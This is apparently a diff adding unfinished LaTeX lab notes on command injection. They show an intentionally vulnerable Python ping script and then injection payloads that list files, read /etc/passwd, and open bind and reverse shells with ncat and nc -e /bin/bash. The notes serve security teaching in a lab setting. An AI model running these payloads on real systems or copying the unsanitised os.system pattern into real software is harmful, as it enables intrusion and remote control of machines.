@@ -1,0 +1,51 @@
+\taughtsession{Lab}{Exploitation Concepts}{2024-02-08}{14:00}{Tobi}{}
+
+The `Trusted Input Problem' refers to a security issues across all areas of computing in which a system or application incorrectly assumes that input received from users or other systems is safe and trustworthy. This assumption can lead to a number of vulnerabilities - including SQL injection, Cross-Site Scripting (XSS), and Command Injection, to name a few. The vulnerabilities arise from where malicious input is not sanitised before processing and therefore gets processed by the system in the same way that it would for clean, correct input; however there may be harmful consequences from processing the malicious input. 
+
+\section{Command Shell Injection}
+Below is an example of vulnerable Python code which allows execution of a shell command after completing it's planned action. The software is designed to accept an IP address and ping it 4 times, to confirm responsiveness.
+\begin{verbatim}
+    import os
+    import sys
+    # Unsafe command execution
+    address = sys.argv[1]
+    response = os.system("ping -c 4 " + address)
+\end{verbatim}
+\textsc{\textit{note: this code is vulnerable and should not be executed outside of a safe lab environment.}}\\
+
+We can run this program as intended with the following command:
+\begin{verbatim}
+    python3 ip-pinger.py 8.8.8.8
+\end{verbatim}
+
+As we know that the user input is not specified and we know that it is being executed with Bash, we can append commands using \verb|&&| or add a new line to Bash using \verb|;|
+\begin{verbatim}
+    python3 ip-pinger.py 8.8.8.8 && ls -la
+\end{verbatim}
+
+The command above, whilst relatively tame, proves that the code is vulnerable to Command Injection which therefore means we can progress to exploiting this system. We are then able to try the following command, which further exploits the system by outputting the contents of \verb|/etc/passwd| file
+\begin{verbatim}
+    python3 IP-pinger.py 8.8.8.8 && cat /etc/passwd
+\end{verbatim}
+
+Now we are able to begin a Bind Shell, which sets up a listening port on our victim machine and gets the attack machine to connect to it. In this lab, this is executed through having two tabs open of a Terminal in the VLABS virtual machine, however in the real world - you would probably be working across two different machines.\\
+
+On the target machine:
+\begin{verbatim}
+    python3 IP-pinger.py 8.8.8.8 && ncat -lvnp 4444 -e /bin/bash 
+\end{verbatim}
+The \verb|ncat -lvnp 4444| tells the \verb|ncat| software to listen on port 4444 for connections. We connect to port 4444 from the attack machine:
+\begin{verbatim}
+    ncat 192.168.1.1 4444
+\end{verbatim}
+
+Alternatively, we are able to use a Reverse Shell, where the target machine connects to the attack machine. On the attack machine, we specify the port to listen on:
+\begin{verbatim}
+    nc -lvnp 4443
+\end{verbatim}
+Then on the server we launch the Vulnerable IP Pinger program and connect to our attack machine:
+\begin{verbatim}
+    python3 IP-pinger.py 8.8.8.8 && nc 192.168.1.1 4443 -e /bin/bash
+\end{verbatim}
+
+TBC
